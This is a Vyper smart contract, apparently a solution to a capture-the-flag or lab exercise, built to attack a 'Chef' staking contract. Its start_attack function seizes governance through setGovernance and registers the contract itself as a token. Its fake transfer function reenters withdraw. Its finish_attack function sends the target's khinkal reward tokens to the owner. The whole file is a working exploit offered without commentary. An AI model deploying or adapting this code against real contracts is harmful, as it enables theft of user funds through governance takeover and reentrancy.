# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IChef:
    def khinkal() -> address: view
    def setGovernance(addr: address): nonpayable
    def addToken(addr: address): nonpayable  
    def poolLength() -> uint256: view
    def deposit(x: uint256, y: uint256): nonpayable 
    def withdraw(x: uint256): nonpayable

owner: immutable(address)

chef: IChef
pid: uint256
count: uint256

@external
@payable
def __init__(_chef: IChef):
    owner = msg.sender
    self.chef = _chef

@external
def start_attack():
    assert msg.sender == owner, "!owner"
    self.chef.setGovernance(self)
    self.chef.addToken(self)
    self.pid = self.chef.poolLength() - 1
    self.count = 1000
    self.chef.deposit(self.pid, self.count)

@external
def finish_attack():
    assert msg.sender == owner, "!owner"
    self.chef.withdraw(self.pid)
    IERC20(self.chef.khinkal()).transfer(
        msg.sender,
        IERC20(self.chef.khinkal()).balanceOf(self),
    )

@external
def transfer(recipient: address, amount: uint256) -> bool:
    if self.count != 0:
        self.count = 0
        self.chef.withdraw(self.pid)
    return True

@external
def transferFrom(sender: address, receiver: address, amount: uint256) -> bool:
    return True

@external
@view
def balanceOf(addr: address) -> uint256:
    return self.count
